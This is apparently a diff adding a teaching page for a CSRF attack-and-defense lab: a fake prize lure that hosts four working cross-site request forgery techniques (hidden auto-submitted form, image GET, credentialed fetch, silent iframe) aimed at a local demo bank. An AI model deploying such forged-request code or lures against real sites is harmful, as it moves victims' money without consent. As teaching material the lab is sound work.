@@ -1,0 +1,256 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>🎉 You Won a Prize!</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body { font-family: 'Segoe UI', sans-serif; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; min-height: 100vh; }
+    .banner { text-align: center; padding: 60px 40px 20px; }
+    .banner h1 { font-size: 42px; margin-bottom: 12px; }
+    .banner p { font-size: 18px; opacity: 0.9; }
+
+    .prize-card { background: white; color: #333; border-radius: 16px; padding: 30px; max-width: 700px; margin: 30px auto; box-shadow: 0 20px 60px rgba(0,0,0,0.3); }
+    .prize-card h2 { color: #764ba2; margin-bottom: 12px; }
+    .prize-card p { color: #666; line-height: 1.6; }
+
+    .attack-section { background: rgba(0,0,0,0.2); border-radius: 16px; padding: 30px; max-width: 700px; margin: 30px auto; }
+    .attack-section h2 { color: #fbbf24; margin-bottom: 12px; }
+    .attack-section p { opacity: 0.9; font-size: 14px; line-height: 1.6; margin-bottom: 12px; }
+    code { background: rgba(0,0,0,0.3); padding: 2px 8px; border-radius: 4px; font-size: 13px; }
+
+    .attack-card { background: rgba(255,255,255,0.1); border: 1px solid rgba(255,255,255,0.2); border-radius: 12px; padding: 20px; margin: 16px 0; }
+    .attack-card h3 { color: #fbbf24; margin-bottom: 8px; font-size: 16px; }
+    .attack-card p { font-size: 13px; opacity: 0.8; }
+
+    button { padding: 12px 24px; border: none; border-radius: 8px; font-size: 14px; cursor: pointer; font-weight: bold; margin: 4px; }
+    .btn-attack { background: #ef4444; color: white; }
+    .btn-attack:hover { background: #dc2626; }
+    .btn-info { background: #0ea5e9; color: white; }
+
+    .status { background: rgba(0,0,0,0.3); border-radius: 8px; padding: 16px; margin: 12px 0; font-family: monospace; font-size: 13px; }
+    .status.success { border: 1px solid #22c55e; }
+    .status.waiting { border: 1px solid #fbbf24; }
+
+    .code-block { background: rgba(0,0,0,0.4); border-radius: 8px; padding: 16px; font-family: 'Consolas', monospace; font-size: 12px; line-height: 1.6; margin: 12px 0; overflow-x: auto; white-space: pre; }
+
+    .footer { text-align: center; padding: 30px; opacity: 0.6; font-size: 13px; }
+  </style>
+</head>
+<body>
+
+  <!-- ============================================ -->
+  <!-- WHAT THE VICTIM SEES: A fake prize page       -->
+  <!-- ============================================ -->
+  <div class="banner">
+    <h1>🎉 Congratulations!</h1>
+    <p>You've been selected for a special reward!</p>
+  </div>
+
+  <div class="prize-card">
+    <h2>🏆 Claim Your $500 Gift Card</h2>
+    <p>
+      You're one of 100 lucky winners! Click below to claim your free Amazon gift card.
+      This offer expires in <strong id="countdown">5:00</strong> minutes.
+    </p>
+    <p style="color: #999; font-size: 12px; margin-top: 16px;">
+      (This is what a victim would see. The real attack is happening below the surface...)
+    </p>
+  </div>
+
+  <!-- ============================================ -->
+  <!-- THE ACTUAL ATTACK: Hidden form + explanation  -->
+  <!-- ============================================ -->
+  <div class="attack-section">
+    <h2>😈 What's Really Happening</h2>
+    <p>
+      This page is the <strong>attacker's website</strong> (running on <code>localhost:4000</code>).
+      Below are different CSRF attack methods that make YOUR browser send a transfer request to the
+      bank (<code>localhost:3000</code>) — using YOUR logged-in session cookies.
+    </p>
+
+    <!-- ATTACK 1: Auto-submitting hidden form -->
+    <div class="attack-card">
+      <h3>Attack 1: Hidden Form (Auto-Submit)</h3>
+      <p>
+        A hidden form that submits itself to the bank's /transfer endpoint.
+        The browser automatically includes your session cookies.
+      </p>
+      <button class="btn-attack" onclick="attack1()">🚀 Launch Attack 1</button>
+      <div id="attack1-status" class="status waiting">Ready to launch...</div>
+
+      <div class="code-block">&lt;!-- This form is invisible to the victim --&gt;
+&lt;form action="http://localhost:3000/transfer" method="POST" id="csrf-form"&gt;
+  &lt;input type="hidden" name="to" value="hacker" /&gt;
+  &lt;input type="hidden" name="amount" value="1000" /&gt;
+&lt;/form&gt;
+&lt;script&gt;document.getElementById('csrf-form').submit();&lt;/script&gt;</div>
+    </div>
+
+    <!-- ATTACK 2: Image tag GET (if transfer was GET) -->
+    <div class="attack-card">
+      <h3>Attack 2: Image Tag (if endpoint accepted GET)</h3>
+      <p>
+        If the bank foolishly accepted GET requests for transfers, an <code>&lt;img&gt;</code> tag would do it.
+        The browser fetches the "image" URL, which is actually a transfer request, with cookies attached.
+        (Our bank uses POST, so this one won't work — but you should know it exists.)
+      </p>
+      <div class="code-block">&lt;!-- This would fire if /transfer accepted GET --&gt;
+&lt;img src="http://localhost:3000/transfer?to=hacker&amp;amount=5000" style="display:none" /&gt;
+
+&lt;!-- The browser sends:
+GET /transfer?to=hacker&amp;amount=5000
+Cookie: connect.sid=victim_session_id    ← auto-attached!
+--&gt;</div>
+    </div>
+
+    <!-- ATTACK 3: fetch() with credentials -->
+    <div class="attack-card">
+      <h3>Attack 3: Fetch with Credentials</h3>
+      <p>
+        Use JavaScript <code>fetch()</code> to send a POST request to the bank.
+        Note: this might be blocked by SOP if the bank doesn't have CORS headers,
+        but the <strong>request still gets sent</strong> — the browser just hides the response.
+      </p>
+      <button class="btn-attack" onclick="attack3()">🚀 Launch Attack 3</button>
+      <div id="attack3-status" class="status waiting">Ready to launch...</div>
+
+      <div class="code-block">fetch('http://localhost:3000/transfer', {
+  method: 'POST',
+  credentials: 'include',  // ← This tells the browser to send cookies!
+  headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+  body: 'to=hacker&amount=500'
+});
+// Browser sends the request WITH cookies
+// SOP blocks reading the RESPONSE, but the transfer already happened!</div>
+    </div>
+
+    <!-- ATTACK 4: iframe + form -->
+    <div class="attack-card">
+      <h3>Attack 4: Iframe + Auto-Submit (Silent)</h3>
+      <p>
+        Like Attack 1, but submits into a hidden iframe so the victim <strong>stays on this page</strong>
+        and doesn't notice anything. The bank page loads inside the invisible iframe.
+      </p>
+      <button class="btn-attack" onclick="attack4()">🚀 Launch Attack 4 (Silent)</button>
+      <div id="attack4-status" class="status waiting">Ready to launch...</div>
+
+      <div class="code-block">&lt;iframe name="csrf-frame" style="display:none"&gt;&lt;/iframe&gt;
+&lt;form action="http://localhost:3000/transfer" method="POST" target="csrf-frame"&gt;
+  &lt;input type="hidden" name="to" value="hacker" /&gt;
+  &lt;input type="hidden" name="amount" value="2000" /&gt;
+&lt;/form&gt;
+&lt;script&gt;document.forms[0].submit();&lt;/script&gt;
+&lt;!-- Submits silently into the hidden iframe. Victim sees nothing. --&gt;</div>
+    </div>
+
+    <div style="text-align: center; margin-top: 20px;">
+      <a href="http://localhost:3000/dashboard" class="btn-info" style="text-decoration: none; display: inline-block;">
+        🏦 Check Bank Dashboard (see the damage)
+      </a>
+    </div>
+  </div>
+
+  <div class="footer">
+    😈 Attacker Site — Project 4: CSRF Attack & Defense
+  </div>
+
+  <!-- Hidden iframe for silent attacks -->
+  <iframe name="csrf-frame" style="display:none;"></iframe>
+
+  <script>
+    // ATTACK 1: Hidden form auto-submit into iframe
+    function attack1() {
+      const status = document.getElementById('attack1-status');
+      status.textContent = '🔄 Submitting hidden form to bank...';
+
+      const form = document.createElement('form');
+      form.action = 'http://localhost:3000/transfer';
+      form.method = 'POST';
+      form.target = 'csrf-frame'; // Submit into hidden iframe
+
+      const toField = document.createElement('input');
+      toField.type = 'hidden';
+      toField.name = 'to';
+      toField.value = 'hacker';
+
+      const amountField = document.createElement('input');
+      amountField.type = 'hidden';
+      amountField.name = 'amount';
+      amountField.value = '1000';
+
+      form.appendChild(toField);
+      form.appendChild(amountField);
+      document.body.appendChild(form);
+      form.submit();
+
+      status.textContent = '✅ Form submitted! $1,000 transferred to "hacker". Check bank dashboard!';
+      status.className = 'status success';
+    }
+
+    // ATTACK 3: fetch() with credentials
+    function attack3() {
+      const status = document.getElementById('attack3-status');
+      status.textContent = '🔄 Sending fetch() request to bank...';
+
+      fetch('http://localhost:3000/transfer', {
+        method: 'POST',
+        credentials: 'include',
+        headers: {
+          'Content-Type': 'application/x-www-form-urlencoded',
+        },
+        body: 'to=hacker&amount=500',
+      })
+        .then((res) => {
+          status.textContent = `✅ Request sent! Status: ${res.status}. Check bank dashboard!`;
+          status.className = 'status success';
+        })
+        .catch((err) => {
+          status.textContent = `⚠️ Request was sent but CORS blocked reading the response. Transfer may have succeeded! Check dashboard.`;
+          status.className = 'status success';
+        });
+    }
+
+    // ATTACK 4: iframe + form (silent)
+    function attack4() {
+      const status = document.getElementById('attack4-status');
+      status.textContent = '🔄 Silently submitting via hidden iframe...';
+
+      const form = document.createElement('form');
+      form.action = 'http://localhost:3000/transfer';
+      form.method = 'POST';
+      form.target = 'csrf-frame';
+
+      const toField = document.createElement('input');
+      toField.type = 'hidden';
+      toField.name = 'to';
+      toField.value = 'hacker';
+
+      const amountField = document.createElement('input');
+      amountField.type = 'hidden';
+      amountField.name = 'amount';
+      amountField.value = '2000';
+
+      form.appendChild(toField);
+      form.appendChild(amountField);
+      document.body.appendChild(form);
+      form.submit();
+
+      status.textContent = '✅ Silently transferred $2,000 to "hacker"! Victim saw nothing. Check dashboard!';
+      status.className = 'status success';
+    }
+
+    // Countdown timer for the fake prize
+    let seconds = 300;
+    setInterval(() => {
+      seconds--;
+      if (seconds < 0) seconds = 0;
+      const m = Math.floor(seconds / 60);
+      const s = seconds % 60;
+      document.getElementById('countdown').textContent =
+        m + ':' + (s < 10 ? '0' : '') + s;
+    }, 1000);
+  </script>
+</body>
+</html>
